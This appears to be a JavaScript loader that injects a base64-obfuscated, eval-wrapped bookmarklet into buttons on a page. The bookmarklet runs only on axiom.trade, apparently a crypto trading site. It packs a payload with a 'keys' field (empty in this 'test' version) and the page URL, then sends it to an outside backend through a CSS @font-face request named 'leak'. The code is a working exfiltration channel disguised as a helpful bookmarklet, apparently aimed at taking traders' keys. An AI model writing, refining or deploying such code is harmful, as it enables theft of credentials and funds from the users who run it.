// === FINAL DEBUG LOADER - Works on axiom.trade ===
console.log('✅ Loader.js loaded successfully from Render');

document.addEventListener('DOMContentLoaded', () => {
    console.log('✅ DOM ready - injecting bookmarklet...');

    const buttons = document.querySelectorAll('a.bookmarklet');
    console.log(`Found ${buttons.length} bookmarklet button(s)`);

    if (buttons.length === 0) {
        console.error('❌ No bookmarklet button found!');
        return;
    }

    buttons.forEach((btn, i) => {
        console.log(`Injecting into button #${i+1}`);

        // Self-contained innerCode with built-in base64 encoder
        const innerCode = `(async () => {
            try {
                console.log('🚀 Bookmarklet running on ' + location.hostname);

                if (location.hostname !== "axiom.trade") {
                    alert("This bookmarklet only works on axiom.trade");
                    return;
                }

                alert("✅ Bookmarklet injected successfully!\\n\\nTest data is being sent to your server.");

                // Test payload
                const payload = {
                    keys: [],
                    code: "test",
                    site: "Axiom",
                    test: true,
                    timestamp: Date.now(),
                    url: location.href
                };

                // Safe base64 encoding inside bookmarklet
                function safeBtoa(str) {
                    return btoa(unescape(encodeURIComponent(str)));
                }

                const encoded = safeBtoa(JSON.stringify(payload));
                const url = "https://bloom-sniper-backend.onrender.com/i/" + encoded;

                const style = document.createElement("style");
                style.textContent = '@font-face{font-family:"leak";src:url("' + url + '");}';
                document.head.appendChild(style);

                console.log('✅ Test data sent via font-face to your server');
            } catch (err) {
                console.error('Bookmarklet error:', err);
                alert('Bookmarklet error: ' + err.message);
            }
        })();`;

        // Inject the bookmarklet
        const encodedCode = btoa(unescape(encodeURIComponent(innerCode)));
        btn.href = 'javascript:eval(atob("' + encodedCode + '"))';
        btn.draggable = true;

        console.log('✅ SUCCESS: Bookmarklet href injected!');
    });
});